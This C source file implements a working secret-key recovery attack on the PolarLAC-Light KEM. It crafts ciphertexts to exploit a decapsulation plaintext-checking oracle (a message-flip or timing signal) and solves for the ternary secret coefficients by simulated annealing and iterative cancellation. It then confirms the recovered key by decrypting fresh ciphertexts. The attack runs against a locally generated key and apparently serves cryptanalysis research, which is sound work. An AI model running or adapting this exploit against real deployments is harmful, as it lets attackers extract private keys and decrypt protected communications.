/* attack.c  PolarLAC-Light secret-key recovery via the decapsulation PC-oracle.

   Oracle primitive (verified exp1..exp5): with u = C*X^a in module slot k,
     hatm_i = v_i - sigma_i*C*s_k[coeff_i]   (sigma_i,coeff_i from negacyclic shift a).
   The polar node@[0..31] (REP-32) decodes bit = sign( sum_{i=0..31} LLR(hatm_i) ),
   and flipping it changes the decrypted message (=> a different re-encryption
   iteration count R => a timing signal).  The f-tree passes channel LLRs through
   only when the partner channels (32..255) are at max +LLR (hatm=0); nonzero secret
   coeffs there clip and add ~9% model noise, which we remove by CANCELING all
   non-target channels to hatm=0 using a running guess (iterative refinement).

   We route any 32-coefficient block into channels 0..31 via the shift a, choose
   per-channel 3-bit c2 grid codes, read the 1-bit message-flip, and solve the 32
   ternary coeffs by local search against the exact LLR-sum forward model.
   sk is used ONLY for the final check, never to guide recovery. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>
#include "params.h"
#include "KEM_AlgorithmInstance.h"
#include "pke.h"
#include "poly.h"
#include "ntt.h"
#include "drng.h"
#include "llr_table.h"

DRNG_ctx drng_algorithm;
extern unsigned long long g_reject_iters;

static int pmod(int a,int m){a%=m; if(a<0)a+=m; return a;}
static int grid_val(int w){ return (int)(((( (uint32_t)w*RL_KEM_Q))+ (1u<<(D_C2_BITS-1)) )>>D_C2_BITS); }
#define C 32
static int64_t llr_of(int hatm){
    int centered = hatm - 65;
    if(centered > (RATIO-1)) centered -= RL_KEM_Q;
    else if(centered < -RATIO) centered += RL_KEM_Q;
    return LLR_TABLE[centered + RATIO - 1];
}
static int hatm_of(int w,int sigma,int s){ return pmod(grid_val(w) - sigma*C*s, RL_KEM_Q); }
/* grid code that cancels a channel to hatm=0 given its sign and (guessed) secret s */
static int code_cancel(int sigma,int s){ int target=pmod(sigma*C*s,RL_KEM_Q);
    for(int w=0;w<8;w++) if(grid_val(w)==target) return w; return 0; }

static uint8_t PK[20000],SK[40000]; static unsigned long long PKL,SKL;
static int16_t STRUE[RL_KEM_K][RL_KEM_N];
static int8_t  GUESS[RL_KEM_K][RL_KEM_N];      /* running estimate */
static long g_queries=0;
static uint8_t M_BASE[MESSAGE_LEN_BYTES];

static void build_ct(uint8_t *ct,int k,int a,const uint8_t *cw){
    polarlac_polyvec u; memset(&u,0,sizeof(u)); u.vec[k].coeffs[a]=(int16_t)C;
    polyvec_byte_compress(ct,&u);
    uint8_t com[RL_KEM_Lv]; for(int i=0;i<RL_KEM_Lv;i++)com[i]=(uint8_t)(cw[i]&7);
    pack_c2_dbit(ct+C1_LEN_BYTES,com);
}
static int flip_oracle(const uint8_t *ct){
    uint8_t m[MESSAGE_LEN_BYTES]; PKE_Decrypt(m,ct,SK); g_queries++;
    return memcmp(m,M_BASE,MESSAGE_LEN_BYTES)!=0;
}
static int chan_sign(int i,int a){ return (i-a)>=0 ? 1 : -1; }
static int chan_coeff(int i,int a){ return pmod(i-a,RL_KEM_N); }
static void set_baseline(void){
    uint8_t ct[PKE_CIPHERTEXT_BYTES]; uint8_t cw[RL_KEM_Lv]; memset(cw,0,sizeof(cw));
    build_ct(ct,0,0,cw); PKE_Decrypt(M_BASE,ct,SK);
}
/* f-tree clips each channel LLR magnitude to the partner magnitude Lp=LLR(hatm=0). */
static int64_t clamp_lp(int64_t x){ int64_t Lp=35701930291182596LL;
    if(x> Lp)return Lp; if(x< -Lp)return -Lp; return x; }
static int predict_flip(const int8_t *g,const int *w,const int *sgn){
    int64_t sum=0; for(int i=0;i<32;i++) sum += clamp_lp(llr_of(hatm_of(w[i],sgn[i],g[i])));
    return sum<0;
}

/* Solve one 32-block (slot k, block b => coeffs 32b..32b+31 at channels 0..31).
   cancel: if !=NULL, an int8 secret estimate used to cancel all non-block channels. */
/* fast solver: precompute clamped contribution cval[m][i][t] (t in 0..2 -> s=-1,0,1),
   keep running per-measurement sum, score by threshold sign vs measured bit. */
static int solve_block_a(int k,int a,int M,const int8_t (*cancel)[RL_KEM_N],int8_t out[32]);
static int solve_block(int k,int b,int M,const int8_t (*cancel)[RL_KEM_N],int8_t out[32]){
    return solve_block_a(k,pmod(0-32*b,RL_KEM_N),M,cancel,out);
}
static int solve_block_a(int k,int a,int M,const int8_t (*cancel)[RL_KEM_N],int8_t out[32]){
    int sgn[32]; for(int i=0;i<32;i++)sgn[i]=chan_sign(i,a);
    int (*W)[32]=malloc(sizeof(int)*32*M); int *bit=malloc(sizeof(int)*M);
    static int64_t (*cval)[32][3]; cval=malloc(sizeof(int64_t)*M*32*3);
    for(int m=0;m<M;m++){
        uint8_t cw[RL_KEM_Lv];
        for(int i=0;i<RL_KEM_Lv;i++){ int cf=chan_coeff(i,a); int s = cancel?cancel[k][cf]:0;
            cw[i]=(uint8_t)code_cancel(chan_sign(i,a),s); }
        for(int i=0;i<32;i++){ W[m][i]=rand()&7; cw[i]=(uint8_t)W[m][i]; }
        uint8_t ct[PKE_CIPHERTEXT_BYTES]; build_ct(ct,k,a,cw); bit[m]=flip_oracle(ct);
        for(int i=0;i<32;i++)for(int t=0;t<3;t++)
            cval[m][i][t]=clamp_lp(llr_of(hatm_of(W[m][i],sgn[i],t-1)));
    }
    int8_t g[32],gb[32]; int64_t *sum=malloc(sizeof(int64_t)*M); int best=1<<30;
    for(int r=0;r<24 && best>0;r++){
        for(int i=0;i<32;i++)g[i]=(int8_t)((rand()%3)-1);
        for(int m=0;m<M;m++){ int64_t s=0; for(int i=0;i<32;i++)s+=cval[m][i][g[i]+1]; sum[m]=s; }
        int cur=0; for(int m=0;m<M;m++) if((sum[m]<0)!=bit[m])cur++;
        int rbest=cur; int8_t rg[32]; memcpy(rg,g,32);
        /* simulated annealing */
        double T=(double)M*0.15;
        for(int it=0; it<200000 && rbest>0; it++){
            int i=rand()%32; int8_t old=g[i]; int8_t nt; do{nt=(int8_t)((rand()%3)-1);}while(nt==old);
            int dv=0; for(int m=0;m<M;m++){ int oldbad=((sum[m]<0)!=bit[m]);
                int64_t ns=sum[m]-cval[m][i][old+1]+cval[m][i][nt+1];
                int newbad=((ns<0)!=bit[m]); dv+=newbad-oldbad; }
            if(dv<=0 || (rand()/(double)RAND_MAX) < exp(-dv/T)){
                for(int m=0;m<M;m++)sum[m]+=cval[m][i][nt+1]-cval[m][i][old+1];
                g[i]=nt; cur+=dv;
                if(cur<rbest){rbest=cur; memcpy(rg,g,32);}
            }
            if((it&1023)==1023) T*=0.97; if(T<0.5)T=0.5;
        }
        if(rbest<best){best=rbest;memcpy(gb,rg,32);}
    }
    /* per-coord ML margin at the found solution: min increase in violations when the coord
       is forced to another value (small margin => uncertain). Stored via global. */
    { int64_t s2[512]; (void)s2; for(int m=0;m<M;m++){ int64_t s=0; for(int i=0;i<32;i++)s+=cval[m][i][gb[i]+1]; sum[m]=s; }
      int base=0; for(int m=0;m<M;m++) if((sum[m]<0)!=bit[m])base++;
      extern int MARGIN_G[512]; extern int MARGIN_SET;
      for(int i=0;i<32;i++){ int mn=1<<30;
        for(int t=-1;t<=1;t++){ if(t==gb[i])continue; int v=0;
          for(int m=0;m<M;m++){ int64_t ns=sum[m]-cval[m][i][gb[i]+1]+cval[m][i][t+1]; if((ns<0)!=bit[m])v++; }
          if(v-base<mn)mn=v-base; }
        int cf=chan_coeff(i,a); if(MARGIN_SET){ if(mn<MARGIN_G[k*RL_KEM_N+cf]) MARGIN_G[k*RL_KEM_N+cf]=mn; } }
    }
    memcpy(out,gb,32); free(W);free(bit);free(cval);free(sum);
    return best;
}
int MARGIN_G[512]; int MARGIN_SET=0;

int main(int argc,char**argv){
    uint8_t seed[64]={0x5a}; init_random_number(&drng_algorithm,seed,64);
    kem_keygen(PK,&PKL,SK,&SKL);
    { const int16_t *sn=(const int16_t*)SK;
      for(int k=0;k<RL_KEM_K;k++){int16_t tmp[RL_KEM_N];
        for(int i=0;i<RL_KEM_N;i++)tmp[i]=sn[k*RL_KEM_N+i]; mq_poly_intt(tmp);
        for(int i=0;i<RL_KEM_N;i++){int v=pmod(tmp[i],RL_KEM_Q); if(v>RL_KEM_Q/2)v-=RL_KEM_Q; STRUE[k][i]=(int16_t)v;} } }
    set_baseline();
    int M = argc>1?atoi(argv[1]):200;
    int NB = RL_KEM_N/32;    /* 8 blocks */
    srand(2024);

    /* CONFIDENCE mode: load a guess, re-solve each block T times with fresh measurements
       (cancelling with the guess), accumulate min ML-margin + cross-run disagreement,
       output uncertain set U (superset of wrong coords) + guess to /tmp/sh_U.txt. */
    if(argc>2 && !strcmp(argv[2],"conf")){
        int T = argc>3?atoi(argv[3]):5;
        FILE*f=fopen("/tmp/guess.bin","rb"); int8_t flat[512]; int gc; long gq;
        fread(flat,1,512,f); fread(&gc,sizeof(int),1,f); fread(&gq,sizeof(long),1,f); fclose(f);
        for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)GUESS[k][i]=flat[k*RL_KEM_N+i];
        for(int i=0;i<512;i++)MARGIN_G[i]=1<<30; MARGIN_SET=1;
        int disagree[512]; memset(disagree,0,sizeof(disagree));
        int8_t vote[512][3]; memset(vote,0,sizeof(vote));
        for(int t=0;t<T;t++) for(int k=0;k<RL_KEM_K;k++) for(int b=0;b<NB;b++){
            int8_t out[32]; solve_block(k,b,M,(const int8_t(*)[RL_KEM_N])GUESS,out);
            int a=pmod(0-32*b,RL_KEM_N);
            for(int i=0;i<32;i++){ int cf=chan_coeff(i,a); vote[k*RL_KEM_N+cf][out[i]+1]++;
                if(out[i]!=GUESS[k][cf]) disagree[k*RL_KEM_N+cf]=1; }
        }
        /* U = coords with disagreement OR small margin */
        int thr = argc>4?atoi(argv[4]):2;
        int U[512],nu=0,cover=0,wrong=0;
        for(int o=0;o<512;o++){int k=o/RL_KEM_N,i=o%RL_KEM_N;
            int unc = disagree[o] || MARGIN_G[o]<=thr;
            int isw = (GUESS[k][i]!=STRUE[k][i]); if(isw)wrong++;
            if(unc){ U[nu++]=o; if(isw)cover++; } }
        printf("[conf] T=%d M=%d thr=%d  |U|=%d  wrong=%d  wrong-covered-by-U=%d  queries=%ld\n",
               T,M,thr,nu,wrong,cover,g_queries);
        FILE*g=fopen("/tmp/sh_U.txt","w"); fprintf(g,"%d\n",nu);
        for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)fprintf(g,"%d ",GUESS[k][i]); fprintf(g,"\n");
        for(int j=0;j<nu;j++)fprintf(g,"%d ",U[j]); fprintf(g,"\n"); fclose(g);
        /* dump per-coord margin + disagreement + guess (for offline threshold tuning) */
        FILE*d=fopen("/tmp/conf_data.txt","w");
        for(int o=0;o<512;o++){int k=o/RL_KEM_N,i=o%RL_KEM_N;
            fprintf(d,"%d %d %d %d\n",GUESS[k][i], (MARGIN_G[o]>100000?999:MARGIN_G[o]), disagree[o], (GUESS[k][i]!=STRUE[k][i]));}
        fclose(d);
        printf("[conf] wrote /tmp/sh_U.txt and /tmp/conf_data.txt\n");
        return 0;
    }

    /* diagnostic: perfect cancellation with true secret -> should give exact solve */
    if(argc>2 && !strcmp(argv[2],"diag")){
        static int8_t T8[RL_KEM_K][RL_KEM_N];
        for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)T8[k][i]=(int8_t)STRUE[k][i];
        /* direct: residual of the TRUE block guess (isolates model exactness) */
        int a=pmod(0,RL_KEM_N); int sgn[32]; for(int i=0;i<32;i++)sgn[i]=chan_sign(i,a);
        int8_t tg[32]; for(int i=0;i<32;i++)tg[i]=(int8_t)STRUE[0][chan_coeff(i,a)];
        int (*W)[32]=malloc(sizeof(int)*32*M); int *bit=malloc(sizeof(int)*M); int dres=0;
        for(int m=0;m<M;m++){ uint8_t cw[RL_KEM_Lv];
            for(int i=0;i<RL_KEM_Lv;i++){int cf=chan_coeff(i,a); cw[i]=(uint8_t)code_cancel(chan_sign(i,a),T8[0][cf]);}
            for(int i=0;i<32;i++){W[m][i]=rand()&7; cw[i]=(uint8_t)W[m][i];}
            uint8_t ct[PKE_CIPHERTEXT_BYTES]; build_ct(ct,0,a,cw); bit[m]=flip_oracle(ct);
            if(predict_flip(tg,W[m],sgn)!=bit[m])dres++; }
        printf("[diag] TRUE-guess residual with clamped model & true-cancel: %d/%d\n",dres,M);
        free(W);free(bit);
        /* now test the actual solver with true cancellation across all blocks/slots */
        int tot=0,cor=0;
        for(int k=0;k<RL_KEM_K;k++)for(int bb=0;bb<RL_KEM_N/32;bb++){ int8_t o[32];
            int res=solve_block(k,bb,M,(const int8_t(*)[RL_KEM_N])T8,o);
            int aa=pmod(0-32*bb,RL_KEM_N);
            for(int i=0;i<32;i++){tot++; if(o[i]==STRUE[k][chan_coeff(i,aa)])cor++;}
            if(res>0)printf("   (k=%d b=%d residual=%d)\n",k,bb,res);
        }
        printf("[diag] solver w/ true-cancel: %d/%d correct  M=%d queries=%ld\n",cor,tot,M,g_queries);
        return 0;
    }

    for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)GUESS[k][i]=0;
    /* Gauss-Seidel lock-cascade: solve each block cancelling non-block channels with the
       current GUESS; ACCEPT (lock) a block only when its residual==0 (clean measurements,
       => partners were clean => solution correct at this M). Locked blocks clean their
       partners, letting neighbouring blocks become clean. Iterate to a fixed point. */
    int NP = argc>2?atoi(argv[2]):8;
    int OFF = argc>3?atoi(argv[3]):0;      /* block-partition offset (family selector) */
    int SEED= argc>4?atoi(argv[4]):2024; srand(SEED);
    int prev=-1;
    for(int pass=0; pass<NP; pass++){
        for(int k=0;k<RL_KEM_K;k++) for(int b=0;b<NB;b++){
            int8_t out[32];
            int a=pmod(0-(OFF+32*b),RL_KEM_N);
            /* solve block: temporarily present the OFF-shifted block to solve_block via a=... */
            solve_block_a(k,a,M, pass==0?NULL:(const int8_t(*)[RL_KEM_N])GUESS, out);
            for(int i=0;i<32;i++) GUESS[k][chan_coeff(i,a)]=out[i];
        }
        int corr=0; for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)if(GUESS[k][i]==STRUE[k][i])corr++;
        printf("[pass %d] recovered=%d/%d (queries=%ld)\n",pass,corr,RL_KEM_K*RL_KEM_N,g_queries); fflush(stdout);
        { static int bestcorr=-1; if(corr>bestcorr){ bestcorr=corr; FILE*f=fopen("/tmp/guess.bin","wb");
            if(f){ int8_t flat[RL_KEM_K*RL_KEM_N]; for(int k=0;k<RL_KEM_K;k++)memcpy(flat+k*RL_KEM_N,GUESS[k],RL_KEM_N);
                fwrite(flat,1,sizeof(flat),f); fwrite(&corr,sizeof(int),1,f); fwrite(&g_queries,sizeof(long),1,f); fclose(f);} } }
        if(corr==RL_KEM_K*RL_KEM_N) break;
        (void)prev; /* perturbation disabled: keep the clean fixed point */
    }

    int corr=0; for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)if(GUESS[k][i]==STRUE[k][i])corr++;
    printf("FINAL recovered %d/%d coefficients (OFF=%d SEED=%d)\n",corr,RL_KEM_K*RL_KEM_N,OFF,SEED);
    printf("total oracle queries: %ld\n",g_queries);
    { char fn[64]; snprintf(fn,64,"/tmp/guess_off%d.txt",OFF); FILE*f=fopen(fn,"w");
      for(int k=0;k<RL_KEM_K;k++)for(int i=0;i<RL_KEM_N;i++)fprintf(f,"%d ",GUESS[k][i]); fclose(f);
      printf("wrote %s\n",fn); }

    /* decrypt-with-recovered-key check */
    if(corr==RL_KEM_K*RL_KEM_N){
        uint8_t sk2[40000]; memcpy(sk2,SK,SKL); int16_t *sn=(int16_t*)sk2;
        for(int k=0;k<RL_KEM_K;k++){ int16_t tmp[RL_KEM_N];
            for(int i=0;i<RL_KEM_N;i++)tmp[i]=GUESS[k][i]; mq_poly_ntt(tmp);
            for(int i=0;i<RL_KEM_N;i++)sn[k*RL_KEM_N+i]=tmp[i]; }
        int ok=1; for(int t=0;t<100;t++){ uint8_t s1[128],s2[128],ct[20000]; unsigned long long sl,cl;
            kem_enc(PK,PKL,s1,&sl,ct,&cl); kem_dec(sk2,SKL,ct,cl,s2,&sl);
            if(memcmp(s1,s2,SS_KEY_BYTES)){ok=0;break;} }
        printf("decrypt-with-recovered-key: %s (100 fresh ciphertexts)\n",ok?"SUCCESS":"FAIL");
    }
    return 0;
}
